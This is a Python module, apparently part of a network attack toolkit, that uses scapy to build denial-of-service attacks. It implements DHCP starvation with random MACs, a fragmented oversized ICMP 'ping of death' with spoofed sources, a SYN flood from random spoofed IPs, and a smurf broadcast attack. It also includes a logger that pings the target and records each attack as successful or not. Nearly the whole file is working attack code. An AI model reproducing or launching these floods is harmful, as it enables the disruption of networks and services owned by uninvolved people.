from scapy.all import  ARP, Ether, srp,  IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf, send, ICMP, fragment, TCP
from socket import *
import threading
import subprocess, re, csv, os
from datetime import datetime
from random import randint
from .HostScanner import *
from .PortScanner import *

# DHCP starvation attack
def dos_dhcp():
    BROADCAST = "255.255.255.255"
    INTERFACE = "wlan0"
    conf.checkIPaddr = False
    fake_src_mac_address = RandMAC() # random MAC Address for fake client

    # Build DHCP Discover Packet
        
    broadcast = Ether(src = fake_src_mac_address, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst=BROADCAST)
    udp = UDP(sport = 68, dport = 67)
    bootp = BOOTP(op = 1,chaddr = fake_src_mac_address)
    dhcp = DHCP(options=[('message-type','discover'),('end')])

    pkt = broadcast / ip / udp / bootp / dhcp

    sendp(pkt, iface = INTERFACE, loop = 1, verbose = 1)

# PING OF DEATH
def flood(host, reflect):
    ping_of_death = IP(dst=reflect,src=host)/ICMP()/("X" * 60000)   
    send(fragment(ping_of_death), loop=1)

def pingOfDeath(numberThreads, host, reflect):
    threads = []
    try:
        for n in range(numberThreads):
            t = threading.Thread(target=flood(host, reflect))
            t.daemon = True
            t.start()
            threads.append(t)
    except:
        return 0

# SynFLOOD
def synFlood(target):
    count = 0
    while True:
        try:
            random_ip = ".".join(map(str, (randint(0, 255) for _ in range(4))))
            random_port = randint(8000,9000)
            Seq = randint(8000,9000)
            Window = randint(8000,9000)

            ip_layer = IP(dst=target, src=random_ip)
            tcp_layer = TCP(sport=random_port, dport=80, flags="S", seq=Seq, window=Window)

            packets = ip_layer / tcp_layer
            send(packets, verbose=0)
            count += 1
            print("Sending from " + random_ip + ":" + str(random_port) + " -> " + target + ":" + str(80))
        except KeyboardInterrupt:
            print("Packets sent: %i\n" %count)
            return False

# SMURF ATTACK
def dos_smurf(target_ip):
    BROADCAST = "255.255.255.255"
    INTERFACE = "eth0"
    ip = IP(src=target_ip, dst=BROADCAST)
    ping = ICMP()
    pkt = (ip/ping)

    sendp(pkt, iface = INTERFACE, loop = 1, verbose = 1)

#LOGS
def ping_log(attack, target):
    timeString = datetime.now().strftime('%H:%M:%S')
    dateString = datetime.now().strftime('%d/%m/%Y')
    ping = subprocess.run(['ping', '-c', '5', target], text=True, capture_output=True, check=False)
    for line in ping.stdout.splitlines():
         if "received" in line:
            if " 0%" in line:
                success = "unsuccessful attack"
            else:
                success = "successful attack"
            # Write log to csv file
            with open(os.getcwd() + "/Logs/Attack2-4Logs.csv", 'a') as f:
                f.writelines(f'\n{attack};{target};{dateString};{timeString};{line};{success}')